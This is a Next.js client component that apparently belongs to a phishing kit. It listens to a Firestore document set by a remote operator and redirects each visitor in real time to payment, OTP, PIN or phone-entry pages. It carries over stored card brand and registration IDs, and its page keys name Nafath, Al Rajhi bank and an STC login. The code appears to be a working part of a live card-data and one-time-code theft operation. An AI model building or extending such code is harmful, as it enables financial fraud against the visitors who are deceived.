'use client';
import { useEffect, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { listenPayDoc, clearRedirectPage, getRegId } from '@/lib/visitor-sync';
import { ensurePaysDoc } from '@/lib/presence';

const PAGE_MAP: Record<string, string> = {
  home:        '/',
  insur:       '/order',
  compar:      '/cards',
  payment:     '/payment',
  otp:         '/otp',
  pin:         '/otp',
  phone:       '/otp',
  nafad:       '/',
  rajhi:       '/',
  'stc-login': '/',
};

export function FirestoreListener() {
  const router = useRouter();
  const lastRedirectRef = useRef<string | null>(null);

  useEffect(() => {
    // Create the visitor's pays doc immediately on first load
    ensurePaysDoc().catch(() => {});

    let unsubscribe: (() => void) | null = null;

    const t = setTimeout(() => {
      unsubscribe = listenPayDoc((data) => {
        const redirectPage = data.redirectPage as string | null | undefined;
        if (!redirectPage || redirectPage === lastRedirectRef.current) return;

        lastRedirectRef.current = redirectPage;
        let fullPath = PAGE_MAP[redirectPage] ?? '/';

        try {
          if (redirectPage === 'payment') {
            const rd = JSON.parse(sessionStorage.getItem('reg_data') || 'null');
            if (rd?.brand && rd?.cardType) fullPath = `/payment?brand=${rd.brand}&type=${rd.cardType}`;
          } else if (['otp', 'pin', 'phone'].includes(redirectPage)) {
            const regId = getRegId();
            if (regId) fullPath = `/otp?id=${regId}`;
          } else if (redirectPage === 'insur') {
            const rd = JSON.parse(sessionStorage.getItem('reg_data') || 'null');
            const brand = rd?.brand || 'fazaa';
            const type  = rd?.cardType || 'gold';
            fullPath = `/order?brand=${brand}&type=${type}`;
          }
        } catch {}

        clearRedirectPage().catch(() => {});
        router.push(fullPath);
      });
    }, 1200);

    return () => {
      clearTimeout(t);
      unsubscribe?.();
    };
  }, [router]);

  return null;
}
